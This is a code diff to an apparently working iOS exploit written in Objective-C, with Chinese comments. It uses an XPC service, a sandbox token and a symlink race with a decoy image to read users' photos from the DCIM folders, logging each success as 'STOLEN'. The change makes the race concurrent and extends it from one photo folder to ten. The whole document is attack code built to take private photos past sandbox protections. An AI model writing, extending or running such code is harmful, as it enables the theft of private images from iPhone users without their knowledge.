@@ -495,7 +495,7 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
                       forAssetURL:url
                  withSandboxToken:token
                        identifier:@"d"
-                        requestID:++_reqID
+                        requestID:[self nextRequestID]
                          andReply:^(id arg1, id arg2) {
         img = [self imageFromReply:arg1];
         text = [self textFromReply:arg1];
@@ -544,6 +544,65 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
     return YES;
 }
 
+// 并发下 requestID 必须原子自增
+- (int)nextRequestID
+{
+    @synchronized (self) {
+        return ++_reqID;
+    }
+}
+
+// 并发扫描一个目录里 [start, start+count) 的编号段；每张照片用独立临时文件。
+- (int)scanChunk:(int)folder
+           start:(int)start
+           count:(int)count
+             tmp:(NSString *)tmp
+           decoy:(NSData *)decoyData
+           total:(int *)scannedTotal
+{
+    NSArray<NSNumber *> *delays = @[@0, @10, @20, @30, @50];
+    NSArray<NSString *> *exts = @[@"HEIC", @"JPG", @"PNG"];
+    __block int hits = 0;
+    dispatch_semaphore_t limit = dispatch_semaphore_create(8);
+    dispatch_group_t group = dispatch_group_create();
+    dispatch_queue_t q = dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0);
+
+    for (int j = 0; j < count; j++) {
+        dispatch_semaphore_wait(limit, DISPATCH_TIME_FOREVER);
+        dispatch_group_async(group, q, ^{
+            int img = start + j;
+            for (int e = 0; e < 3; e++) {
+                NSString *ext = exts[(NSUInteger)e];
+                NSString *target = [NSString stringWithFormat:
+                    @"/private/var/mobile/Media/DCIM/%dAPPLE/IMG_%04d.%@",
+                    folder, img, ext];
+                NSString *racePath = [tmp stringByAppendingPathComponent:
+                    [NSString stringWithFormat:@"race_%d_%d_%d.%@", folder, img, e, ext]];
+                NSString *symPath = [tmp stringByAppendingPathComponent:
+                    [NSString stringWithFormat:@"sym_%d_%d_%d.%@", folder, img, e, ext]];
+                for (int a = 0; a < 5; a++) {
+                    if (scannedTotal) {
+                        @synchronized (self) { (*scannedTotal)++; }
+                    }
+                    if ([self tryExfil:target
+                              racePath:racePath
+                           symlinkPath:symPath
+                             decoyData:decoyData
+                                 delay:(useconds_t)[delays[(NSUInteger)a] unsignedIntValue]]) {
+                        @synchronized (self) { hits++; }
+                        [self log:[NSString stringWithFormat:
+                            @"STOLEN %dAPPLE/IMG_%04d.%@", folder, img, ext]];
+                        break;
+                    }
+                }
+            }
+            dispatch_semaphore_signal(limit);
+        });
+    }
+    dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
+    return hits;
+}
+
 - (void)runDump
 {
     [self setupLogFile];
@@ -562,53 +621,33 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
     [UIImagePNGRepresentation(decoyImg) writeToFile:decoyPath atomically:YES];
     NSData *decoyData = [NSData dataWithContentsOfFile:decoyPath];
 
-    NSString *exts[] = {@"HEIC", @"JPG", @"PNG"};
-    NSString *raceFiles[] = {
-        [tmp stringByAppendingPathComponent:@"race.HEIC"],
-        [tmp stringByAppendingPathComponent:@"race.JPG"],
-        [tmp stringByAppendingPathComponent:@"race.PNG"]
-    };
-    NSString *symFiles[] = {
-        [tmp stringByAppendingPathComponent:@"sym.HEIC"],
-        [tmp stringByAppendingPathComponent:@"sym.JPG"],
-        [tmp stringByAppendingPathComponent:@"sym.PNG"]
-    };
-
     int exfiled = 0;
     int scanned = 0;
 
-    for (int img = 1; img <= 9999; img++)
+    // 每个目录都把 IMG_0001..9999 全部扫完、不提前跳过；扫完一个目录再进下一个。
+    // 段内 10 张并发，每张一个任务。
+    for (int folder = 100; folder <= 109; folder++)
     {
-        BOOL got = NO;
-
-        for (int e = 0; e < 3 && !got; e++)
+        int folderHits = 0;
+        for (int start = 1; start <= 9999; start += 10)
         {
-            NSString *target = [NSString stringWithFormat:
-                @"/private/var/mobile/Media/DCIM/100APPLE/IMG_%04d.%@", img, exts[e]];
-
-            useconds_t delays[] = {0, 10, 20, 30, 50};
-            for (int a = 0; a < 5 && !got; a++)
-            {
-                scanned++;
-                BOOL hit = [self tryExfil:target
-                                 racePath:raceFiles[e]
-                              symlinkPath:symFiles[e]
-                                decoyData:decoyData
-                                    delay:delays[a]];
-                if (hit)
-                {
-                    exfiled++;
-                    got = YES;
-                    [self log:[NSString stringWithFormat:@"STOLEN #%d IMG_%04d.%@", exfiled, img, exts[e]]];
-                }
-                usleep(2000);
+            int hits = [self scanChunk:folder
+                                 start:start
+                                 count:10
+                                   tmp:tmp
+                                 decoy:decoyData
+                                 total:&scanned];
+            if (hits > 0) {
+                folderHits += hits;
+                exfiled += hits;
+            }
+            if ((start - 1) % 500 == 0) {
+                [self log:[NSString stringWithFormat:
+                    @"%dAPPLE/IMG_%04d... exfil=%d probes=%d", folder, start, exfiled, scanned]];
             }
         }
-
-        if (img % 50 == 0 && !got)
-        {
-            [self log:[NSString stringWithFormat:@"100APPLE/IMG_%04d... Exfiltrated: %d Probes: %d", img, exfiled, scanned]];
-        }
+        [self log:[NSString stringWithFormat:
+            @"%dAPPLE done: hits=%d scanned=%d", folder, folderHits, scanned]];
     }
 
     [self log:[NSString stringWithFormat:@"DONE exfil=%d scanned=%d ocrErr=%d", exfiled, scanned, _ocrErrCount]];
